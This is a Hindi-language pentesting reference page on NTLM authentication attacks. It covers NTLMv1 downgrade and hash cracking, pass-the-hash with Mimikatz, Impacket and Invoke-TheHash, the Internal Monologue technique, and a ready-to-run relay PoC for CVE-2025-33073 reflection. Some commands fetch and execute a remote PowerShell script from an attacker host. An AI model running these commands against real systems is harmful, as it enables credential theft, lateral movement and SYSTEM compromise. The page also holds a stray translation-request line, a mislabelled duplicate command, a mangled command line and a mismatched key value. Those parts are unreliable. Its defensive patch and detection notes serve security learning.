# NTLM

{{#include ../../banners/hacktricks-training.md}}


## मूल जानकारी

जिन परिवेशों में **Windows XP और Server 2003** चल रहे हैं, वहाँ LM (Lan Manager) hashes का उपयोग किया जाता है, हालाँकि यह व्यापक रूप से जाना जाता है कि इन्हें आसानी से compromise किया जा सकता है। एक विशिष्ट LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, यह दर्शाता है कि LM का उपयोग नहीं हो रहा है; यह खाली string का hash है।

डिफ़ॉल्ट रूप से, **Kerberos** authentication protocol प्राथमिक विधि है। NTLM (NT LAN Manager) कुछ विशेष परिस्थितियों में काम आता है: Active Directory मौजूद न हो, domain मौजूद न हो, गलत configuration के कारण Kerberos काम न कर रहा हो, या किसी valid hostname के बजाय IP address का उपयोग करके connection करने की कोशिश की जाए।

Network packets में **"NTLMSSP"** header की मौजूदगी NTLM authentication process का संकेत देती है।

Authentication protocols — LM, NTLMv1 और NTLMv2 — के लिए support एक विशिष्ट DLL द्वारा उपलब्ध कराया जाता है, जो `%windir%\Windows\System32\msv1\_0.dll` में स्थित है।

**मुख्य बिंदु**:

- LM hashes असुरक्षित हैं और खाली LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) इसके उपयोग न होने का संकेत देता है।
- Kerberos डिफ़ॉल्ट authentication method है; NTLM का उपयोग केवल कुछ परिस्थितियों में होता है।
- NTLM authentication packets की पहचान "NTLMSSP" header से की जा सकती है।
- LM, NTLMv1 और NTLMv2 protocols को system file `msv1\_0.dll` support करती है।

## LM, NTLMv1 और NTLMv2

आप जाँच और configure कर सकते हैं कि कौन-सा protocol इस्तेमाल होगा:

### GUI

_secpol.msc_ चलाएँ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. इसमें 6 levels होते हैं (0 से 5 तक)।

![LM, NTLMv1 और NTLMv2 - GUI: secpol.msc चलाएँ - Local policies - Security Options - Network Security: LAN Manager authentication level. इसमें 6 levels होते हैं (0 से 5 तक)](<../../images/image (919).png>)

### Registry

इससे level 5 सेट होगा:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

संभावित मान:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Basic NTLM Domain authentication Scheme

1. **user** अपने **credentials** दर्ज करता है
2. Client machine **authentication request भेजती है**, जिसमें **domain name** और **username** शामिल होते हैं
3. **server** **challenge** भेजता है
4. **client**, password के hash को key के रूप में इस्तेमाल करके **challenge को encrypt करता है** और उसे response के रूप में भेजता है
5. **server**, **domain name, username, challenge और response** को **Domain controller** को भेजता है। अगर Active Directory configured **नहीं है** या domain name, server का नाम है, तो **credentials locally जाँचे जाते हैं**।
6. **Domain controller जाँचता है कि सब कुछ सही है या नहीं** और जानकारी server को भेजता है

**server** और **Domain Controller**, **Netlogon** server के ज़रिए **Secure Channel** बना सकते हैं, क्योंकि Domain Controller को server का password पता होता है (यह **NTDS.DIT** db में होता है)।

### Local NTLM authentication Scheme

Authentication ऊपर बताई गई प्रक्रिया जैसी ही है, **लेकिन** **server** को **SAM** file में authenticate करने की कोशिश कर रहे user का **hash** पता होता है। इसलिए, Domain Controller से पूछने के बजाय, **server खुद जाँचता है** कि user authenticate कर सकता है या नहीं।

### NTLMv1 Challenge

**challenge की लंबाई 8 bytes** होती है और **response की लंबाई 24 bytes** होती है।

**NT hash (16bytes)** को **7bytes के 3 हिस्सों** में बाँटा जाता है (7B + 7B + (2B+0x00\*5)): **आखिरी हिस्से को zeros से भर दिया जाता है**। फिर, **challenge** को हर हिस्से से अलग-अलग **cipher** किया जाता है और **cipher किए गए** नतीजों को **जोड़** दिया जाता है। कुल: 8B + 8B + 8B = 24Bytes।

**समस्याएँ**:

- **Randomness** की कमी
- NT hash पता लगाने के लिए 3 हिस्सों पर अलग-अलग **attack** किया जा सकता है
- **DES को crack किया जा सकता है**
- तीसरी key में हमेशा **5 zeros** होते हैं।
- **एक ही challenge** दिए जाने पर **response** भी **एक जैसा** होगा। इसलिए, आप पीड़ित को **"1122334455667788"** string को **challenge** के रूप में दे सकते हैं और पहले से **computed rainbow tables** का इस्तेमाल करके response पर attack कर सकते हैं।

### NTLMv1 attack

Unconstrained delegation आधुनिक environments में कम आम है, लेकिन किसी host से authentication करवाने के लिए उपलब्ध **Print Spooler service** का अब भी दुरुपयोग किया जा सकता है।

आपके पास AD में पहले से मौजूद credentials/sessions का दुरुपयोग करके **printer से अपने नियंत्रण वाले किसी host के विरुद्ध authenticate करवाने** की कोशिश की जा सकती है। फिर, `metasploit auxiliary/server/capture/smb` या `responder` का इस्तेमाल करके **authentication challenge को 1122334455667788 पर सेट** करें और authentication attempt को capture करें। अगर यह **NTLMv1** का इस्तेमाल करके किया गया था, तो आप इसे **crack** कर पाएँगे।\
अगर आप `responder` का इस्तेमाल कर रहे हैं, तो authentication को **downgrade** करने के लिए **flag `--lm` इस्तेमाल करने** की कोशिश कर सकते हैं।\
_ध्यान दें कि इस technique के लिए authentication, NTLMv1 का इस्तेमाल करके होना चाहिए (NTLMv2 मान्य नहीं है)।_

याद रखें कि authentication के दौरान printer computer account का इस्तेमाल करेगा, और computer accounts में **लंबे और random passwords** होते हैं, जिन्हें आम **dictionaries** का इस्तेमाल करके crack कर पाना **शायद संभव नहीं होगा**। लेकिन **NTLMv1** authentication में **DES** का इस्तेमाल होता है ([यहाँ अधिक जानकारी](#ntlmv1-challenge)), इसलिए DES को crack करने के लिए खास तौर पर बनी services का इस्तेमाल करके आप इसे crack कर पाएँगे (उदाहरण के लिए, [https://crack.sh/](https://crack.sh) या [https://ntlmv1.com/](https://ntlmv1.com) का इस्तेमाल कर सकते हैं)।

### NTLMv1 attack with hashcat

NTLMv1 पर [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi) से भी attack किया जा सकता है। यह captured NTLMv1 messages को Hashcat के लिए उपयुक्त formats में बदलता है।<sup>[[1]](#references)</sup>

कमांड

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

नीचे दिया गया आउटपुट देगा:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

अनुवाद के लिए कृपया सामग्री भेजें।

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

hashcat चलाएँ (इसे hashtopolis जैसे tool के ज़रिए distributed तरीके से चलाना बेहतर है), क्योंकि अन्यथा इसमें कई दिन लगेंगे।

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

इस मामले में हमें पता है कि इसका password password है, इसलिए demo के लिए हम cheat करेंगे:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

अब हमें cracked des keys को NTLM hash के हिस्सों में बदलने के लिए hashcat-utilities का उपयोग करना होगा:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

अंत में, आख़िरी हिस्सा:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

उन्हें एक साथ मिलाएँ:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

**challenge की लंबाई 8 bytes होती है** और **2 responses भेजे जाते हैं**: एक की लंबाई **24 bytes** होती है और **दूसरे** की लंबाई **परिवर्तनीय** होती है।

**पहला response**, **client और domain** से बनी **string** को **key** के रूप में **NT hash** के **MD4 hash** का उपयोग करके **HMAC_MD5** से cipher करके बनाया जाता है। फिर **परिणाम** को **key** के रूप में इस्तेमाल करके **challenge** को **HMAC_MD5** से cipher किया जाता है। इसमें **8 bytes का client challenge** जोड़ दिया जाता है। कुल: 24 B।

**दूसरा response** **कई मानों** का उपयोग करके बनाया जाता है (एक नया client challenge, **replay attacks** से बचने के लिए एक **timestamp**...)

अगर आपके पास **सफल authentication exchange वाला PCAP** है, तो domain, username, server challenge और NTLMv2 response निकालें, capture को Hashcat के लिए format करें और password recovery की कोशिश करने के लिए mode `5600` का उपयोग करें। संग्रहित व्यावहारिक walkthrough में packet-field extraction की प्रक्रिया दी गई है, जबकि Hashcat के examples में वर्तमान में स्वीकार किया जाने वाला format बताया गया है।<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**जब आपके पास victim का hash हो**, तो आप उसका **प्रतिरूपण** करने के लिए इसका उपयोग कर सकते हैं।\
आपको ऐसे **tool** का उपयोग करना होगा जो उस **hash** का इस्तेमाल करके **NTLM authentication करेगा**, **या** आप एक नया **sessionlogon** बना सकते हैं और उस **hash** को **LSASS** में **inject** कर सकते हैं, ताकि कोई भी **NTLM authentication होने पर** उस **hash का उपयोग हो।** Mimikatz यही दूसरा तरीका अपनाता है।

**कृपया याद रखें कि Computer accounts का उपयोग करके भी Pass-the-Hash attacks किए जा सकते हैं।**

### **Mimikatz**

**इसे administrator के रूप में चलाना आवश्यक है**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

यह वर्तमान स्थानीय user के अंतर्गत process launch करता है, जबकि LSASS दिए गए credentials को उसके outbound network logon से जोड़ता है। इसके बाद आप plaintext password जाने बिना, `runas /netonly` की तरह दिए गए user के रूप में network resources तक पहुँच सकते हैं।

### Linux से Pass-the-Hash

Linux से Pass-the-Hash का उपयोग करके आप Windows machines में code execution प्राप्त कर सकते हैं।\
[**Impacket PsExec के साथ Pass-the-Hash execution के व्यावहारिक उदाहरण देखें।**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)

### Impacket के Windows compiled tools

आप [यहाँ से Windows के लिए impacket binaries डाउनलोड कर सकते हैं](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)।

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (इस मामले में आपको एक command निर्दिष्ट करनी होगी; interactive shell प्राप्त करने के लिए cmd.exe और powershell.exe मान्य नहीं हैं)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Impacket की कई अन्य binaries भी हैं...

### Invoke-TheHash

आप यहाँ से powershell scripts प्राप्त कर सकते हैं: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

यह फ़ंक्शन पिछले modes को जोड़ता है। आप **कई hosts** पास कर सकते हैं, चुने गए targets को बाहर रख सकते हैं और _SMBExec, WMIExec, SMBClient,_ या _SMBEnum_ चुन सकते हैं। अगर आप _**Command**_ parameter के बिना **SMBExec** या **WMIExec** चुनते हैं, तो यह केवल जाँचता है कि आपके पास पर्याप्त permissions हैं या नहीं।

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**इसे administrator के रूप में चलाना आवश्यक है**

यह टूल mimikatz जैसा ही काम करेगा (LSASS memory में बदलाव करेगा)।

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### username और password के साथ Manual Windows remote execution


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host से credentials निकालना

ज़्यादा जानकारी के लिए, [**Windows Credentials चुराना**](../stealing-credentials/README.md) देखें।

## Internal Monologue attack

Internal Monologue Attack एक stealthy credential extraction technique है, जो attacker को **LSASS process से सीधे संपर्क किए बिना** victim की machine से NTLM hashes निकालने देती है। Mimikatz के विपरीत, जो memory से सीधे hashes पढ़ता है और जिसे endpoint security solutions या Credential Guard अक्सर block कर देते हैं, यह attack **Security Support Provider Interface (SSPI) के ज़रिए NTLM authentication package (MSV1_0) को local calls** करने का लाभ उठाता है। Attacker पहले **NTLM settings को downgrade** करता है (जैसे LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), ताकि NetNTLMv1 की अनुमति मिले। फिर वह running processes से मिले मौजूदा user tokens का impersonation करता है और किसी ज्ञात challenge का उपयोग करके NetNTLMv1 responses बनाने के लिए locally NTLM authentication शुरू करता है।<sup>[[4]](#references)</sup>

इन NetNTLMv1 responses को capture करने के बाद, attacker **precomputed rainbow tables** का उपयोग करके मूल NTLM hashes जल्दी recover कर सकता है और lateral movement के लिए आगे Pass-the-Hash attacks कर सकता है। अहम बात यह है कि Internal Monologue Attack stealthy बना रहता है, क्योंकि इससे network traffic उत्पन्न नहीं होता, code inject नहीं होता और सीधे memory dumps नहीं बनते। इसलिए Mimikatz जैसी पारंपरिक methods की तुलना में defenders के लिए इसका पता लगाना कठिन होता है।

यदि enforced security policies के कारण NetNTLMv1 स्वीकार नहीं किया जाता, तो attacker NetNTLMv1 response प्राप्त करने में विफल हो सकता है।

इस स्थिति से निपटने के लिए Internal Monologue tool को update किया गया: NetNTLMv1 विफल होने पर भी **NetNTLMv2 responses capture** करने के लिए यह `AcceptSecurityContext()` का उपयोग करके server token को dynamically प्राप्त करता है। हालांकि NetNTLMv2 को crack करना कहीं अधिक कठिन है, फिर भी सीमित मामलों में यह relay attacks या offline brute-force का रास्ता खोलता है।

PoC यहां मिल सकता है: **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**।<sup>[[4]](#references)</sup>

## NTLM Relay और Responder

**इन attacks को करने के तरीके पर विस्तृत guide यहां पढ़ें:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Network capture से NTLM challenges parse करना

**आप इसका उपयोग कर सकते हैं:** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## Serialized SPNs के ज़रिए NTLM और Kerberos *Reflection* (CVE-2025-33073)

Windows में ऐसे *reflection* attacks को रोकने के लिए कई mitigations हैं, जिनमें किसी host से शुरू हुए NTLM (या Kerberos) authentication को SYSTEM privileges पाने के लिए वापस **उसी** host पर relay किया जाता है।  

Microsoft ने MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) और बाद के patches के ज़रिए ज़्यादातर public chains को बंद कर दिया था। हालांकि, **CVE-2025-33073** दिखाता है कि *marshalled* (serialized) target-info वाले Service Principal Names (SPNs) को **SMB client किस तरह truncate करता है**, इसका दुरुपयोग करके protections को अब भी bypass किया जा सकता है।<sup>[[5]](#references)[[6]](#references)</sup>

### bug का संक्षिप्त विवरण
1. Attacker एक **DNS A-record** register करता है, जिसका label एक marshalled SPN encode करता है – उदाहरण के लिए:
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Victim को उस hostname पर authenticate करने के लिए मजबूर किया जाता है (PetitPotam, DFSCoerce, आदि)।
3. जब SMB client target string `cifs/srv11UWhRCAAAAA…` को `lsasrv!LsapCheckMarshalledTargetInfo` में भेजता है, तो `CredUnmarshalTargetInfo` call serialized blob को **हटा देता है**, जिससे **`cifs/srv1`** बचता है।
4. अब `msv1_0!SspIsTargetLocalhost` (या Kerberos का equivalent) target को *localhost* मानता है, क्योंकि छोटा host हिस्सा computer name (`SRV1`) से मेल खाता है।
5. परिणामस्वरूप, server `NTLMSSP_NEGOTIATE_LOCAL_CALL` set करता है और context में **LSASS का SYSTEM access-token** inject करता है (Kerberos में SYSTEM-marked subsession key बनाई जाती है)।
6. इस authentication को `ntlmrelayx.py` **या** `krbrelayx.py` से relay करने पर उसी host पर full SYSTEM rights मिल जाते हैं।<sup>[[5]](#references)</sup>

### तुरंत इस्तेमाल करने योग्य PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### पैच और शमन
* **CVE-2025-33073** के लिए KB पैच, `mrxsmb.sys::SmbCeCreateSrvCall` में एक जाँच जोड़ता है, जो ऐसे किसी भी SMB कनेक्शन को रोकती है जिसके target में marshalled info हो (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`)।<sup>[[5]](#references)[[6]](#references)</sup>
* SMB relay destinations पर **SMB signing** लागू करें। अन्य destinations के लिए, उस protocol की अपनी signing या Extended Protection आवश्यकताओं और patch level का आकलन करें; केवल SMB signing से यह तय नहीं होता कि HTTPS WinRM relay संभव है या नहीं।
* `*<base64>...*` जैसे DNS records की निगरानी करें और coercion vectors (PetitPotam, DFSCoerce, AuthIP...) को block करें।

### डिटेक्शन के विचार
* ऐसे network captures जिनमें `NTLMSSP_NEGOTIATE_LOCAL_CALL` हो और client IP ≠ server IP हो।
* ऐसा Kerberos AP-REQ जिसमें subsession key हो और client principal, hostname के बराबर हो।
* Windows Event 4624/4648 SYSTEM logons, जिनके तुरंत बाद उसी host से remote SMB writes हों।<sup>[[5]](#references)</sup>

एक serialized target-information DNS name, coerced authentication को attacker की ओर भेजकर AD CS web-enrollment endpoint पर **cross-protocol relay** करा सकता है। यह same-host reflection से अलग परिणाम है: [ESC8 enrollment conditions](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), DNS-write अधिकार, coercion path और target का patch level—इन सबका स्वतंत्र रूप से आकलन करना चाहिए।

**March 2026** के उस local reflection variant के लिए, जो `NT AUTHORITY\SYSTEM` तक पहुँचने के लिए **SMB arbitrary ports** और **TCP connection reuse** का दुरुपयोग करता है, देखें:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 बहुउपकरण](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat उदाहरण hashes – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash उपयोगिताएँ](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: LSASS को छुए बिना NTLM Hashes प्राप्त करना](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection समाप्त हो गया, NTLM Reflection अमर रहे!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [NTLMv2 Hash को crack करना – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
